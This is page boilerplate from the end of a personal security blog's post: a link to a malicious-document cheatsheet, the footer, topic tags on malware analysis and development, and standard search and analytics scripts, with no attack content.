btn-outline-primary disabled"><p>-</p></span> <a href="/posts/Maldoc-Cheatsheet/" class="btn btn-outline-primary"><p>Malicious Document: Cheatsheet and Note</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/0xfareed">fareedfauzi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/fileless/">Fileless</a> <a class="post-tag" href="/tags/powershell/">Powershell</a> <a class="post-tag" href="/tags/malicious-document/">Malicious Document</a> <a class="post-tag" href="/tags/malware-analysis/">Malware Analysis</a> <a class="post-tag" href="/tags/malware-development/">Malware Development</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://fareedfauzi.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script> <script async src="https://www.googletagmanager.com/gtag/js?id="></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); </script>
